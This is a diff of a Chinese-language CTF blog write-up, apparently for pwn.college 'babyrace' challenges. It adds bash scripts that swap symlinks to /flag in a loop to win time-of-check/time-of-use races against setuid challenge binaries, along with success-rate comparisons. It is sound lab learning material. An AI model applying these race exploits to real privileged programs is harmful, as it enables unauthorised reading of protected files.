@@ -36,9 +36,12 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220508231821229.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220505165437735.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220511235547367.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515153055539.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515153138069.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220515155725438.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220512222315120.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-05-15T01:25:04.310Z">
+<meta property="article:modified_time" content="2022-05-15T16:13:56.103Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -224,7 +227,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      71k 字
+      73k 字
     </span>
   
 
@@ -233,7 +236,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      886 分钟
+      908 分钟
     </span>
   
 
@@ -274,7 +277,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年5月15日 上午
+                  不可视境界线最后变动于：2022年5月16日 凌晨
                 
               </p>
             
@@ -1534,6 +1537,9 @@
 <p>所谓的libc.so.6其实也就是一个符号链接. 如果要更改libc文件直接临时修改一下符号链接<strong>还要注意ld和libc的匹配问题</strong>. 或者使用patchelf改一下, 链接<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254868-1.htm">在这</a>. (那个glibc_all_in_one就在这儿用的)(成天用的都是工具, 真想自己写一个)</p>
 <img src="../../image/pwn-modules/image-20220507102703295.png" srcset="/img/loading.gif" lazyload alt="image-20220507102703295" style="zoom:80%;" />
 
+<blockquote>
+<p>YouTube-42视频是rop的新用法… pwntool还内置了rop. 真行啊.</p>
+</blockquote>
 <h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>啥主要的保护也没开, 简单的覆盖返回地址.</p>
 <h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>没开啥保护, 查了一下lseek的使用, 主要就是win函数分成了两个阶段, 一次读一半.</p>
 <p>只要在栈上弄两个返回地址就行了. 简单</p>
@@ -1703,6 +1709,9 @@
 </ul>
 </li>
 </ul>
+<blockquote>
+<p>YouTube-50是babyrace的视频. level5做不下去了准备看看.</p>
+</blockquote>
 <h4 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h4><p>先整个创建超级长的路径的脚本. 顺便学了学shell编程.</p>
 <p>难怪视频里只见到t_end, 因为这样路径上每个文件夹其实都是符号链接, 所以最多20个.</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>ln -s $(pwd) ./root<br>for i in &#123;97..116&#125;	#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    pushd .<br>    mkdir $prefix<br>    cd $prefix<br>    for j in &#123;1..25&#125;<br>    do<br>        mkdir ./$j<br>        cd ./$j<br>    done<br>    innerwd=$(pwd)<br>    popd<br>    cp -a ./root $innerwd<br>    ln -s $innerwd $(pwd)/$&#123;prefix&#125;_end<br>done<br></code></pre></div></td></tr></table></figure>
@@ -1711,15 +1720,32 @@
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>prefix=&#x27;a&#x27;<br>path=&#x27;./&#x27; <br>for i in &#123;97..116&#125; 	#或者直接用&#123;a..t&#125;<br>do<br>    prefix=$(printf &quot;\\x$(printf %x $i)&quot;)<br>    path+=$&#123;prefix&#125;_end/root/<br><br>done<br>ls $path	#test path(though must be true...)<br><span class="hljs-meta">#</span><span class="bash">result is:</span><br>./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/t_end/root/<br></code></pre></div></td></tr></table></figure>
 
 <h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>在程序使用第一个参数当做字符串open文件之前直接停下来等我, 这个时候就可以更改flag的符号链接为那个名字, 于是绕过了不能含有’flag’字符和不能是符号链接的限制.</p>
-<p>.1程序的补充shell:</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>rm aa bb cc 2&gt;/dev/null<br>touch aa<br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br>ln -s /flag ./cc<br><span class="hljs-meta">#</span><span class="bash">一开始是一个普通文件, 然后改成到/flag的符号链接</span><br>while [ 1 ]<br>do<br>    sleep 0.05 #不知道有没有用的说...希望有<br>    mv bb aa <br>    sleep 0.05<br>    mv aa bb<br>    mv cc aa<br>    sleep 0.05<br>    mv aa cc<br>done<br></code></pre></div></td></tr></table></figure>
+<h5 id="1程序的补充shell"><a href="#1程序的补充shell" class="headerlink" title=".1程序的补充shell"></a>.1程序的补充shell</h5><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>rm aa bb cc 2&gt;/dev/null<br>touch aa<br>ln -s /flag ./cc<br><span class="hljs-meta">#</span><span class="bash">一开始是一个普通文件, 然后改成到/flag的符号链接</span><br>while [ 1 ]<br>do<br>    #sleep 0.05 #不知道有没有用的说...希望有. 果然没用<br>    mv bb aa <br>    sleep 0.0005<br>    mv aa bb<br>    mv cc aa<br>    sleep 0.0005<br>    mv aa cc<br>done<br></code></pre></div></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure>
 
 <p>删除一堆文件夹:</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r !(peda|*sh)<br></code></pre></div></td></tr></table></figure>
 
-<p><strong>改成短路径之后进行了一下成功率比较:</strong> </p>
+<h5 id="成功率比较"><a href="#成功率比较" class="headerlink" title="成功率比较"></a>成功率比较</h5><blockquote>
+<p>改成短路径之后进行了一下成功率比较:</p>
+</blockquote>
+<p>比较shellscript: </p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>path=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/<br>path_2=./a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/s_end/root/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/../../home/hacker/<br>rate=0<br>rates=0<br>ratess=0<br>for i in &#123;1..1000&#125;<br>do<br>    res=$(/challenge/babyrace_level1.1 $&#123;path&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rate++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 $&#123;path_2&#125;aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((ratess++))<br>    fi<br><br>    res=$(/challenge/babyrace_level1.1 ./aa | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        ((rates++))<br>    fi<br>done<br>echo longpath: $rate/1000<br>echo path_2: $ratess/1000<br>echo shortpath: $rates/1000<br></code></pre></div></td></tr></table></figure>
+
+<p>结果:</p>
+<p>不带sleep:</p>
+<img src="../../image/pwn-modules/image-20220515153055539.png" srcset="/img/loading.gif" lazyload alt="image-20220515153055539" style="zoom:80%;" />
+
+<p>带了sleep(0.05s):</p>
+<img src="../../image/pwn-modules/image-20220515153138069.png" srcset="/img/loading.gif" lazyload alt="image-20220515153138069" style="zoom:80%;" />
+
+<p>和好多因素有关, 不过不用sleep看起来更高效, 但是没见到长路径带来的好处…….</p>
+<p>好了, 有了新发现, 产生竞态条件的shell脚本中第一个sleep看起来没什么意义然后尝试删除, <strong>成功率直接大幅上涨</strong>:</p>
+<img src="../../image/pwn-modules/image-20220515155725438.png" srcset="/img/loading.gif" lazyload alt="image-20220515155725438" style="zoom:80%;" />
+
+<p>不过长路径还是没啥作用. 如果不加上<strong>sleep 0.0005</strong>, 那么成功率直降为5/1000.</p>
+<p>会随着sleep的时间波动, 还是0.0005最高. 在0.005的时候出现path_2的成功率最高. 全都是迷之行为, 至于nice就不试了….</p>
 <h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>完全一样</p>
 <h4 id="level3-3"><a href="#level3-3" class="headerlink" title="level3"></a>level3</h4><p>在前两题的基础之上检查大小不能超过256字节, 而且在buf[256]之后有一个控制进入win()的v7, 改改文件名很容易绕过</p>
 <h4 id="level4-4"><a href="#level4-4" class="headerlink" title="level4"></a>level4</h4><p>利用上面的方法更改打开文件进行栈溢出然后改跳转地址跳转到win().</p>
@@ -1732,21 +1758,27 @@
 
 <ul>
 <li>这样的话, <del>参数就定成/home/hacker下的e(0 size file),</del>  </li>
-<li>dirname()只是一个字符串操作, 会截取前面的一部分路径. 所以不能在参数中使用相对路径, 否则dirname会返回当前文件夹: <code>.</code>, 这样没法绕过dirname, 工作目录又不能改成除了hacker之外的.</li>
 </ul>
 </blockquote>
+<p>dirname()只是一个字符串操作, 会截取前面的一部分路径. 所以不能在参数中使用相对路径, 否则dirname会返回当前文件夹: <code>.</code>, 这样没法绕过dirname, 工作目录又不能改成除了hacker之外的.</p>
 <p>第一阶段只判断了文件存在与否以及符号链接(no follow lstat), 第二阶段才判断目录信息(use dirname() strip argv[1], and follow link stat), 第三阶段是真正的打开文件.</p>
 <ul>
-<li>首先touch一个/home/hacker/a/b文件, 通过name和symlink验证, </li>
-<li>然后ln两个/home/hacker/a -&gt; /home, 不用管b其实根本不在/home中.</li>
-<li>最后再ln一个/home/hacker/a/b -&gt; /flag</li>
+<li>首先touch一个/home/hacker/aa/bb文件, 通过name和symlink验证, </li>
+<li>然后ln两个/home/hacker/aa -&gt; /home, 不用管bb其实根本不在/home中.</li>
+<li>最后再ln一个/home/hacker/aa/bb -&gt; /flag</li>
 </ul>
-<p>写了一个脚本避免重复输入一些命令, 不过想清楚之后倒是一遍过了.</p>
+<h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>写了一个脚本避免重复输入一些命令, 不过想清楚之后倒是一遍过了.</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    cd a<br>    touch b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s /home /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure>
 
 <p>woc, 我就说怎么不太像竞态条件, 原来.0只是教学, .1都没有getchar()这个函数了.</p>
 <p>重新做一下.</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir a<br>    touch a/b<br>    exit<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>    exit<br>else<br>    echo &#x27;invalid argument&#x27;<br>    exit<br>fi<br><br>while (1)<br>do<br>    mv a b<br>    ln -s /home /home/hacker/a<br><br>    #rm a ./b/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/b<br>fi<br>done<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>rm aa bb cc -rf 2&gt;/dev/null<br>mkdir aa<br>touch ./aa/bb<br>ln -s /home /home/hacker/cc<br>ln -s /flag /home/hacker/aa/cc<br><span class="hljs-meta">#</span><span class="bash">sleep 0.0005</span><br>while [ 1 ]<br>do<br>    sleep 0.0005<br>    mv aa bb	#change dir name<br>    mv cc aa	#let aa-&gt;/home<br>    sleep 0.0005<br>    <br>    mv aa cc #now cc -&gt; /home, bb is dirctory<br>    mv bb aa #restore aa(dir)<br>    mv ./aa/bb ./aa/dd<br>    mv ./aa/cc ./aa/bb #now ./aa has bb-&gt;/flag, dd plainfile<br>    sleep 0.0005<br>    <br>    #restore context, for non-symlink check<br>    mv ./aa/bb ./aa/cc<br>    mv ./aa/dd ./aa/bb<br>done<br></code></pre></div></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash">持续执行challenge的shell</span><br><br>while [[ 1 ]]<br>do<br>    res=$(/challenge/babyrace_level5.1 /home/hacker/aa/bb | grep &#x27;pwn&#x27;)<br>    if [ $res ]<br>    then<br>        printf &quot;\n$res\n\n&quot;<br>        exit<br>    fi<br>done<br></code></pre></div></td></tr></table></figure>
+
+<p>过不了啊啊啊…</p>
+<h5 id="python大法"><a href="#python大法" class="headerlink" title="python大法"></a>python大法</h5><p>看视频尝试python写法:</p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs"><br></code></pre></div></td></tr></table></figure>
 
 
 
